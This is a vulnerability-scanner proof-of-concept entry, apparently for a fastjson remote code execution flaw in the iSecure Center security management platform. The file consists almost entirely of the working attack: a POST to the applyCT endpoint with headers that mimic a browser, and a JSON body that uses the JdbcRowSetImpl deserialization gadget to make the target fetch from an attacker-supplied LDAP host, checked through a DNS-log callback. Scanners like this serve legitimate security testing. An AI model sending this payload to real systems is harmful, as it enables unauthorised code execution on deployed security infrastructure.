{
        'name': '综合安防管理平台 iSecure Center applyCT fastjson 远程代码执行漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/bic/ssoService/v1/applyCT',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Connection': 'close',
                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
                'Dnt': '1',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Te': 'trailers',
                'Content-Type': 'application/json',
            },
            'data': '{{"a":{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}},"b":{{}}"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{}","autoCommit":true}},"hfe4zyyzldp":"="}}',
            'dnslog': True,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }}]
    }